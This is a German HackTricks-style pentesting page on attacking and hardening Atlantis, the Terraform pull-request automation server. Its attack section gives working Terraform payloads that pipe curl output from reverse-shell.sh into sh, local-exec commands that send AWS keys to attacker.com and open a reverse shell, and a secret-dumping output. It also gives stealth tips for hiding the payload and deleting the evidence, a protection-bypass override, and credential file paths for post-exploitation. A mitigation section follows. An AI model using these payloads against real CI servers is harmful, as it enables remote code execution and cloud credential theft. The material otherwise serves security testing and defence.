# Atlantis Sicherheit

<details>

{% hint style="success" %}
Lernen Sie AWS-Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Lernen Sie GCP-Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositorys einreichen.

</details>
{% endhint %}

## Grundlegende Informationen

Atlantis hilft Ihnen grunds√§tzlich dabei, Terraform von Pull Requests von Ihrem Git-Server aus auszuf√ºhren.

![](<../.gitbook/assets/image (161).png>)

## Lokales Labor

1. Gehen Sie zur **Atlantis-Releases-Seite** unter [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases) und **laden** Sie diejenige herunter, die zu Ihnen passt.
2. Erstellen Sie einen **pers√∂nlichen Token** (mit Repo-Zugriff) Ihres **Github**-Benutzers.
3. F√ºhren Sie `./atlantis testdrive` aus, und es wird ein **Demo-Repo** erstellt, das Sie verwenden k√∂nnen, um mit Atlantis zu kommunizieren.
1. Sie k√∂nnen die Webseite unter 127.0.0.1:4141 aufrufen.

## Atlantis-Zugriff

### Git-Server-Anmeldeinformationen

**Atlantis** unterst√ºtzt mehrere Git-Hosts wie **Github**, **Gitlab**, **Bitbucket** und **Azure DevOps**.\
Um jedoch auf die Repos in diesen Plattformen zuzugreifen und Aktionen auszuf√ºhren, muss diesen Plattformen einige **privilegierter Zugriff gew√§hrt werden** (mindestens Schreibberechtigungen).\
[**Die Dokumentation**](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional) empfiehlt, einen Benutzer speziell f√ºr Atlantis in diesen Plattformen zu erstellen, aber einige Personen verwenden m√∂glicherweise pers√∂nliche Konten.

{% hint style="warning" %}
In jedem Fall wird das **Atlantis-Konto** aus der Sicht eines Angreifers sehr **interessant sein**, **zu kompromittieren**.
{% endhint %}

### Webhooks

Atlantis verwendet optional [**Webhook-Secrets**](https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret), um zu validieren, dass die **Webhooks**, die es von Ihrem Git-Host erh√§lt, **legitim** sind.

Eine M√∂glichkeit, dies zu best√§tigen, w√§re, **Anfragen nur von den IPs** Ihres Git-Hosts zuzulassen, aber ein einfacherer Weg ist die Verwendung eines Webhook-Secrets.

Beachten Sie, dass Sie, es sei denn, Sie verwenden einen privaten Github- oder Bitbucket-Server, die Webhook-Endpunkte ins Internet freigeben m√ºssen.

{% hint style="warning" %}
Atlantis wird **Webhooks freigeben**, damit der Git-Server ihm Informationen senden kann. Aus der Sicht eines Angreifers w√§re es interessant zu wissen, **ob Sie ihm Nachrichten senden k√∂nnen**.
{% endhint %}

### Anbieter-Anmeldeinformationen <a href="#provider-credentials" id="provider-credentials"></a>

[Aus der Dokumentation:](https://www.runatlantis.io/docs/provider-credentials.html)

Atlantis f√ºhrt Terraform einfach aus, indem es `terraform plan` und `apply`-Befehle auf dem Server **ausf√ºhrt, auf dem Atlantis gehostet ist**. Genau wie beim lokalen Ausf√ºhren von Terraform ben√∂tigt Atlantis Anmeldeinformationen f√ºr Ihren spezifischen Anbieter.

Es liegt an Ihnen, wie Sie [Anmeldeinformationen bereitstellen](https://www.runatlantis.io/docs/provider-credentials.html#aws-specific-info) f√ºr Ihren spezifischen Anbieter an Atlantis:

* Das Atlantis [Helm-Chart](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart) und das [AWS Fargate-Modul](https://www.runatlantis.io/docs/deployment.html#aws-fargate) haben ihre eigenen Mechanismen f√ºr Anbieter-Anmeldeinformationen. Lesen Sie deren Dokumentation.
* Wenn Sie Atlantis in einer Cloud ausf√ºhren, haben viele Clouds M√∂glichkeiten, Cloud-API-Zugriff auf Anwendungen zu geben, die auf ihnen ausgef√ºhrt werden, z. B.:
* [AWS EC2-Rollen](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) (Suche nach "EC2-Rolle")
* [GCE-Instanzdienstkonten](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider\_reference)
* Viele Benutzer setzen Umgebungsvariablen, z. B. `AWS_ACCESS_KEY`, dort, wo Atlantis ausgef√ºhrt wird.
* Andere erstellen die erforderlichen Konfigurationsdateien, z. B. `~/.aws/credentials`, dort, wo Atlantis ausgef√ºhrt wird.
* Verwenden Sie den [HashiCorp Vault-Provider](https://registry.terraform.io/providers/hashicorp/vault/latest/docs), um Anbieter-Anmeldeinformationen zu erhalten.

{% hint style="warning" %}
Der **Container**, in dem **Atlantis** **l√§uft**, wird h√∂chstwahrscheinlich **privilegierte Anmeldeinformationen** f√ºr die Anbieter (AWS, GCP, Github...) enthalten, die Atlantis √ºber Terraform verwaltet.
{% endhint %}

### Web-Seite

Standardm√§√üig wird Atlantis eine **Webseite im Port 4141 auf localhost** ausf√ºhren. Diese Seite erm√∂glicht es Ihnen nur, atlantis apply zu aktivieren/deaktivieren und den Planstatus der Repos zu √ºberpr√ºfen und sie zu entsperren (es erlaubt keine √Ñnderungen, daher ist es nicht so n√ºtzlich).

Sie werden sie wahrscheinlich nicht im Internet freigegeben finden, aber standardm√§√üig scheint es, dass **keine Anmeldeinformationen erforderlich sind**, um darauf zuzugreifen (und wenn sie ben√∂tigt werden, sind `atlantis`:`atlantis` die **Standard**-Anmeldeinformationen).

## Serverkonfiguration

Die Konfiguration des `atlantis server` kann √ºber Befehlszeilenoptionen, Umgebungsvariablen, eine Konfigurationsdatei oder eine Kombination der drei angegeben werden.

* Sie finden [**hier die Liste der unterst√ºtzten Flags**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration) des Atlantis-Servers.
* Sie finden [**hier, wie Sie eine Konfigurationsoption in eine Umgebungsvariable umwandeln**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables).

Die Werte werden in dieser Reihenfolge **ausgew√§hlt**:

1. Flags
2. Umgebungsvariablen
3. Konfigurationsdatei

{% hint style="warning" %}
Beachten Sie, dass in der Konfiguration m√∂glicherweise interessante Werte wie **Tokens und Passw√∂rter** enthalten sind.
{% endhint %}

### Repos-Konfiguration

Einige Konfigurationen betreffen, **wie die Repos verwaltet werden**. Es ist jedoch m√∂glich, dass **jedes Repo unterschiedliche Einstellungen erfordert**, daher gibt es M√∂glichkeiten, jedes Repo anzugeben. Dies ist die Priorit√§tsreihenfolge:

1. Repo [**`/atlantis.yml`**](https://www.runatlantis.io/docs/repo-level-atlantis-yaml.html#repo-level-atlantis-yaml-config)-Datei. Diese Datei kann verwendet werden, um anzugeben, wie Atlantis das Repo behandeln soll. Einige Schl√ºssel k√∂nnen jedoch standardm√§√üig nicht ohne einige Flags hier angegeben werden.
1. M√∂glicherweise erforderlich, um durch Flags wie `allowed_overrides` oder `allow_custom_workflows` zugelassen zu werden.
2. [**Serverseitige Konfiguration**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config): Sie k√∂nnen sie mit der Flagge `--repo-config` √ºbergeben, und es handelt sich um eine YAML-Konfiguration, die neue Einstellungen f√ºr jedes Repo konfiguriert (Regexe werden unterst√ºtzt).
3. **Standard**-Werte
#### PR-Schutz

Atlantis erm√∂glicht es anzugeben, ob Sie m√∂chten, dass der **PR** von jemand anderem **`genehmigt`** wird (auch wenn dies nicht in der Branch-Schutzrichtlinie festgelegt ist) und/oder **`zusammenf√ºhrbar`** ist (Branch-Schutzrichtlinien bestanden) **bevor apply ausgef√ºhrt wird**. Aus Sicherheitssicht wird empfohlen, beide Optionen zu setzen.

Wenn `allowed_overrides` True ist, k√∂nnen diese Einstellungen in jedem Projekt durch die Datei `/atlantis.yml` **√ºberschrieben werden**.

#### Skripte

Die Repo-Konfiguration kann **Skripte angeben**, die [**vor**](https://www.runatlantis.io/docs/pre-workflow-hooks.html#usage) (_Pre-Workflow-Hooks_) und [**nach**](https://www.runatlantis.io/docs/post-workflow-hooks.html) (_Post-Workflow-Hooks_) **Ausf√ºhrung eines Workflows ausgef√ºhrt werden**.

Es gibt keine Option, um **diese Skripte in der Repo-Datei `/atlantis.yml`** anzugeben.

#### Workflow

In der Repo-Konfiguration (Server-seitige Konfiguration) k√∂nnen Sie [**einen neuen Standardworkflow angeben**](https://www.runatlantis.io/docs/server-side-repo-config.html#change-the-default-atlantis-workflow) oder [**neue benutzerdefinierte Workflows erstellen**](https://www.runatlantis.io/docs/custom-workflows.html#custom-workflows)**.** Sie k√∂nnen auch angeben, welche **Repos** auf die **neu** generierten **zugreifen** k√∂nnen.\
Dann k√∂nnen Sie der **atlantis.yaml**-Datei jedes Repos erlauben, den zu verwendenden Workflow **anzugeben**.

{% hint style="danger" %}
Wenn die [**Server-seitige Konfiguration**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) die Flagge `allow_custom_workflows` auf **True** gesetzt ist, k√∂nnen Workflows in der **`atlantis.yaml`**-Datei jedes Repos **angegeben** werden. M√∂glicherweise ist es auch erforderlich, dass **`allowed_overrides`** auch **`workflow`** angibt, um den Workflow zu **√ºberschreiben**, der verwendet werden soll.\
Dies gibt im Wesentlichen **RCE im Atlantis-Server f√ºr jeden Benutzer, der auf dieses Repo zugreifen kann**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

#### Conftest Richtlinienpr√ºfung

Atlantis unterst√ºtzt das Ausf√ºhren von **serverseitigen** [**conftest**](https://www.conftest.dev/) **Richtlinien** gegen die Plan-Ausgabe. H√§ufige Anwendungsf√§lle f√ºr die Verwendung dieses Schritts sind:

* Verweigerung der Verwendung einer Liste von Modulen
* √úberpr√ºfung von Attributen eines Ressourcen bei der Erstellung
* Erfassen unbeabsichtigter Ressourcenl√∂schungen
* Verhindern von Sicherheitsrisiken (z. B. das Freigeben sicherer Ports f√ºr die √ñffentlichkeit)

Sie k√∂nnen √ºberpr√ºfen, wie Sie es in [**der Dokumentation**](https://www.runatlantis.io/docs/policy-checking.html#how-it-works) konfigurieren k√∂nnen.

## Atlantis Befehle

In [**der Dokumentation**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis) finden Sie die Optionen, die Sie verwenden k√∂nnen, um Atlantis auszuf√ºhren:
```bash
# Get help
atlantis help

# Run terraform plan
atlantis plan [options] -- [terraform plan flags]
##Options:
## -d directory
## -p project
## --verbose
## You can also add extra terraform options

# Run terraform apply
atlantis apply [options] -- [terraform apply flags]
##Options:
## -d directory
## -p project
## -w workspace
## --auto-merge-disabled
## --verbose
## You can also add extra terraform options
```
## Angriffe

{% hint style="warning" %}
Wenn Sie w√§hrend der Ausnutzung diesen **Fehler** finden: `Error: Error acquiring the state lock`

Sie k√∂nnen es beheben, indem Sie ausf√ºhren:
```
atlantis unlock #You might need to run this in a different PR
atlantis plan -- -lock=false
```
{% endhint %}

### Atlantis Plan RCE - Konfigurations√§nderung in neuem PR

Wenn Sie Schreibzugriff auf ein Repository haben, k√∂nnen Sie einen neuen Branch erstellen und einen PR generieren. Wenn Sie `atlantis plan` ausf√ºhren k√∂nnen (oder es wird m√∂glicherweise automatisch ausgef√ºhrt), k√∂nnen Sie RCE innerhalb des Atlantis-Servers ausf√ºhren.

Sie k√∂nnen dies erreichen, indem Sie Atlantis dazu bringen, eine externe Datenquelle zu laden. F√ºgen Sie einfach ein Payload wie folgt in die `main.tf`-Datei ein:
```json
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Unauff√§lligerer Angriff

Sie k√∂nnen diesen Angriff sogar auf eine **unauff√§lligere Weise** durchf√ºhren, indem Sie diesen Vorschl√§gen folgen:

* Anstatt die Rev-Shell direkt in die Terraform-Datei einzuf√ºgen, k√∂nnen Sie eine **externe Ressource laden**, die die Rev-Shell enth√§lt:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Du kannst den Rev Shell-Code unter [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules) finden.

* In der externen Ressource verwende das **ref**-Feature, um den **Terraform Rev Shell-Code in einem Branch** im Repo zu verstecken, etwas wie: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
* **Anstatt** einen **PR zu Master zu erstellen**, um Atlantis auszul√∂sen, **erstelle 2 Branches** (test1 und test2) und erstelle einen **PR von einem zum anderen**. Wenn du den Angriff abgeschlossen hast, **entferne einfach den PR und die Branches**.

### Atlantis Plan Secrets Dump

Du kannst **geheime Informationen, die von Terraform verwendet werden**, durch Ausf√ºhren von `atlantis plan` (`terraform plan`) dumpen, indem du so etwas in die Terraform-Datei einf√ºgst:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
### Atlantis wendet RCE an - Konfigurations√§nderung in neuem PR

Wenn Sie Schreibzugriff auf ein Repository haben, k√∂nnen Sie einen neuen Branch erstellen und einen PR generieren. Wenn Sie **`atlantis apply` ausf√ºhren k√∂nnen, k√∂nnen Sie RCE innerhalb des Atlantis-Servers** ausf√ºhren.

Sie m√ºssen jedoch normalerweise einige Schutzmechanismen umgehen:

- **Mergeable**: Wenn dieser Schutz in Atlantis festgelegt ist, k√∂nnen Sie **`atlantis apply` nur ausf√ºhren, wenn der PR mergeable ist** (was bedeutet, dass der Branch-Schutz umgangen werden muss).
- √úberpr√ºfen Sie potenzielle [**Branch-Schutzmechanismen-Umgehungen**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)
- **Genehmigt**: Wenn dieser Schutz in Atlantis festgelegt ist, muss ein **anderer Benutzer den PR genehmigen**, bevor Sie `atlantis apply` ausf√ºhren k√∂nnen.
- Standardm√§√üig k√∂nnen Sie den [**Gitbot-Token missbrauchen, um diesen Schutz zu umgehen**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)

Das Ausf√ºhren von **`terraform apply` auf einer b√∂sartigen Terraform-Datei mit** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Sie m√ºssen nur sicherstellen, dass ein Payload wie die folgenden in der Datei `main.tf` endet:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Folgen Sie den **Vorschl√§gen aus der vorherigen Technik**, um diesen Angriff auf eine **unauff√§lligere Weise** durchzuf√ºhren.

### Terraform Param Injection

Wenn `atlantis plan` oder `atlantis apply` ausgef√ºhrt wird, wird Terraform im Hintergrund ausgef√ºhrt. Sie k√∂nnen Befehle an Terraform von Atlantis aus √ºbergeben, indem Sie etwas kommentieren wie:
```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Get terraform plan help

atlantis apply -- <terraform commands>
atlantis apply -- -h #Get terraform apply help
```
Etwas, das Sie √ºbergeben k√∂nnen, sind Umgebungsvariablen, die m√∂glicherweise hilfreich sind, um einige Schutzmechanismen zu umgehen. √úberpr√ºfen Sie Terraform-Umgebungsvariablen unter [https://www.terraform.io/cli/config/environment-variables](https://www.terraform.io/cli/config/environment-variables)

### Benutzerdefinierter Workflow

Ausf√ºhren von **b√∂sartigen benutzerdefinierten Build-Befehlen**, die in einer `atlantis.yaml`-Datei angegeben sind. Atlantis verwendet die `atlantis.yaml`-Datei aus dem Pull-Request-Zweig, **nicht** von `master`.\
Diese M√∂glichkeit wurde in einem vorherigen Abschnitt erw√§hnt:

{% hint style="danger" %}
Wenn die [**serverseitige Konfiguration**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) Flag `allow_custom_workflows` auf **True** gesetzt ist, k√∂nnen Workflows in der **`atlantis.yaml`**-Datei jedes Repos **angegeben** werden. M√∂glicherweise ist es auch erforderlich, dass **`allowed_overrides`** auch **`workflow`** angibt, um den Workflow zu **√ºberschreiben**, der verwendet werden soll.

Dies gibt im Wesentlichen **RCE im Atlantis-Server f√ºr jeden Benutzer, der auf dieses Repo zugreifen kann**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

### Umgehungsplan/Anwendungsschutz

Wenn die [**Serverseitenkonfiguration**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) Flagge `allowed_overrides` so konfiguriert ist, dass `apply_requirements` konfiguriert ist, ist es m√∂glich, dass ein Repository den Plan/Anwendungsschutz √§ndert, um ihn zu umgehen.
```yaml
repos:
- id: /.*/
apply_requirements: []
```
### PR Hijacking

Wenn jemand **`atlantis plan/apply`-Kommentare auf Ihren g√ºltigen Pull Requests sendet,** wird Terraform ausgef√ºhrt, wenn Sie es nicht m√∂chten.

Dar√ºber hinaus, wenn Sie im **Branch-Schutz** nicht konfiguriert haben, um bei jedem **neuen Commit, der darauf geschoben wird,** zu **neubewerten,** k√∂nnte jemand **b√∂sartige Konfigurationen** (√ºberpr√ºfen Sie vorherige Szenarien) in der Terraform-Konfiguration schreiben, `atlantis plan/apply` ausf√ºhren und RCE erhalten.

Dies ist die **Einstellung** im Github-Branch-Schutz:

![](<../.gitbook/assets/image (216).png>)

### Webhook Secret

Wenn es Ihnen gelingt, das Webhook-Secret zu **stehlen,** das verwendet wird, oder wenn **kein Webhook-Secret** verwendet wird, k√∂nnten Sie den Atlantis-Webhook **aufrufen** und **Atlantis-Befehle** direkt aufrufen.

### Bitbucket

Bitbucket Cloud unterst√ºtzt **keine Webhook-Secrets**. Dies k√∂nnte es Angreifern erm√∂glichen, Anfragen von Bitbucket zu **f√§lschen**. Stellen Sie sicher, dass Sie nur Bitbucket-IPs zulassen.

* Dies bedeutet, dass ein **Angreifer** **gef√§lschte Anfragen an Atlantis** stellen k√∂nnte, die so aussehen, als k√§men sie von Bitbucket.
* Wenn Sie `--repo-allowlist` angeben, k√∂nnten sie nur gef√§lschte Anfragen zu diesen Repos stellen, sodass der gr√∂√üte Schaden darin bestehen w√ºrde, `plan/apply` auf Ihren eigenen Repos durchzuf√ºhren.
* Um dies zu verhindern, erlauben Sie [Bitbucket-IP-Adressen](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html) (siehe ausgehende IPv4-Adressen).

## Post-Exploitation

Wenn es Ihnen gelungen ist, Zugriff auf den Server zu erhalten oder zumindest ein LFI zu haben, gibt es einige interessante Dinge, die Sie versuchen sollten zu lesen:

* `/home/atlantis/.git-credentials` Enth√§lt VCS-Zugriffsberechtigungen
* `/atlantis-data/atlantis.db` Enth√§lt VCS-Zugriffsberechtigungen mit mehr Informationen
* `/atlantis-data/repos/<org_name>`_`/`_`<repo_name>/<pr_num>/<workspace>/<path_to_dir>/.terraform/terraform.tfstate` Terraform-Statusdatei
* Beispiel: /atlantis-data/repos/ghOrg\_/\_myRepo/20/default/env/prod/.terraform/terraform.tfstate
* `/proc/1/environ` Umgebungsvariablen
* `/proc/[2-20]/cmdline` Befehlszeile von `atlantis server` (kann sensible Daten enthalten)

## Ma√ünahmen

### Nicht auf √∂ffentlichen Repositories verwenden <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

Da jeder auf √∂ffentlichen Pull Requests kommentieren kann, selbst mit allen verf√ºgbaren Sicherheitsma√ünahmen, ist es immer noch gef√§hrlich, Atlantis auf √∂ffentlichen Repositories ohne ordnungsgem√§√üe Konfiguration der Sicherheitseinstellungen auszuf√ºhren.

### `--allow-fork-prs` nicht verwenden <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

Wenn Sie auf einem √∂ffentlichen Repository ausf√ºhren (was nicht empfohlen wird, siehe oben), sollten Sie `--allow-fork-prs` nicht festlegen (standardm√§√üig auf false), da jeder einen Pull-Request von seinem Fork zu Ihrem Repository √∂ffnen kann.

### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

Atlantis erfordert, dass Sie eine Liste von Repositories angeben, von denen es Webhooks √ºber den `--repo-allowlist`-Flag akzeptieren wird. Zum Beispiel:

* Spezifische Repositories: `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* Ihre gesamte Organisation: `--repo-allowlist=github.com/runatlantis/*`
* Jedes Repository in Ihrer GitHub Enterprise-Installation: `--repo-allowlist=github.yourcompany.com/*`
* Alle Repositories: `--repo-allowlist=*`. N√ºtzlich, wenn Sie sich in einem gesch√ºtzten Netzwerk befinden, aber gef√§hrlich, wenn kein Webhook-Secret festgelegt ist.

Dieses Flag stellt sicher, dass Ihre Atlantis-Installation nicht mit Repositories verwendet wird, die Sie nicht kontrollieren. Siehe `atlantis server --help` f√ºr weitere Details.

### Terraform-Planung sch√ºtzen <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

Wenn Angreifer Pull-Requests mit b√∂sartigem Terraform-Code in Ihrem Bedrohungsmodell einreichen, m√ºssen Sie sich bewusst sein, dass `terraform apply`-Genehmigungen nicht ausreichen. Es ist m√∂glich, b√∂sartigen Code in einem `terraform plan` auszuf√ºhren, indem der [`external`-Datensource](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) oder durch Angabe eines b√∂sartigen Anbieters verwendet wird. Dieser Code k√∂nnte dann Ihre Anmeldeinformationen exfiltrieren.

Um dies zu verhindern, k√∂nnten Sie:

1. Anbieter in das Atlantis-Image einbacken oder hosten und in der Produktion den Ausgang blockieren.
2. Implementieren Sie das Anbieter-Registry-Protokoll intern und blockieren Sie √∂ffentlichen Ausgang, so kontrollieren Sie, wer Schreibzugriff auf die Registry hat.
3. √Ñndern Sie Ihre [serverseitige Repo-Konfiguration](https://www.runatlantis.io/docs/server-side-repo-config.html) im `plan`-Schritt, um gegen die Verwendung von unerlaubten Anbietern oder Datensources oder PRs von nicht erlaubten Benutzern zu validieren. Sie k√∂nnten auch an dieser Stelle zus√§tzliche Validierung hinzuf√ºgen, z.B. eine "Zustimmung" zum PR vor der Fortsetzung des `plan` zu verlangen. Conftest k√∂nnte hier n√ºtzlich sein.

### Webhook-Secrets <a href="#webhook-secrets" id="webhook-secrets"></a>

Atlantis sollte mit Webhook-Secrets ausgef√ºhrt werden, die √ºber die Umgebungsvariablen `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET` festgelegt sind. Selbst wenn das `--repo-allowlist`-Flag festgelegt ist, k√∂nnten Angreifer ohne Webhook-Secret Anfragen an Atlantis stellen, die sich als ein erlaubtes Repository ausgeben. Webhook-Secrets stellen sicher, dass die Webhook-Anfragen tats√§chlich von Ihrem VCS-Anbieter (GitHub oder GitLab) stammen.

Wenn Sie Azure DevOps verwenden, f√ºgen Sie anstelle von Webhook-Secrets einen einfachen Benutzernamen und ein Passwort hinzu.

### Azure DevOps Basic Authentication <a href="#azure-devops-basic-authentication" id="azure-devops-basic-authentication"></a>

Azure DevOps unterst√ºtzt das Senden eines Basic-Authentifizierungs-Headers in allen Webhook-Ereignissen. Dies erfordert die Verwendung einer HTTPS-URL f√ºr Ihren Webhook-Standort.

### SSL/HTTPS <a href="#ssl-https" id="ssl-https"></a>

Wenn Sie Webhook-Secrets verwenden, aber Ihr Datenverkehr √ºber HTTP erfolgt, k√∂nnten die Webhook-Secrets gestohlen werden. Aktivieren Sie SSL/HTTPS mit den Flags `--ssl-cert-file` und `--ssl-key-file`.

### Authentifizierung auf dem Atlantis-Webserver aktivieren <a href="#enable-authentication-on-atlantis-web-server" id="enable-authentication-on-atlantis-web-server"></a>

Es wird dringend empfohlen, die Authentifizierung im Webdienst zu aktivieren. Aktivieren Sie BasicAuth mit `--web-basic-auth=true` und richten Sie einen Benutzernamen und ein Passwort mit den Flags `--web-username=IhrBenutzername` und `--web-password=IhrPasswort` ein.

Sie k√∂nnen diese auch als Umgebungsvariablen √ºbergeben `ATLANTIS_WEB_BASIC_AUTH=true` `ATLANTIS_WEB_USERNAME=IhrBenutzername` und `ATLANTIS_WEB_PASSWORD=IhrPasswort`.

## Referenzen

* [**https://www.runatlantis.io/docs**](https://www.runatlantis.io/docs)
* [**https://www.runatlantis.io/docs/provider-credentials.html**](https://www.runatlantis.io/docs/provider-credentials.html)

<details>

{% hint style="success" %}
Lernen & √ºben Sie AWS-Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP-Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
{% endhint %}
